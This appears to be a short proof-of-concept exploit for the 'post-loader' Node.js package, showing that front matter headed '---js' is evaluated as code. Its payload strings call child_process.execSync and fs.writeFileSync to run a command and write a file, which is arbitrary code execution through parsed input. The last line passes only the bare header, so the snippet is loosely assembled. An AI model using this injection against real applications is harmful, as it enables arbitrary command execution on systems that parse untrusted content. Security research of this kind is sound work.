const postLoader = require('post-loader')
var payload = '---js\n((require("child_process")).execSync("touch rce"))';
var payload =  '---js\n((require("fs")).writeFileSync("aaa", "aaa"))';
var payload='';
new postLoader('---js\n');
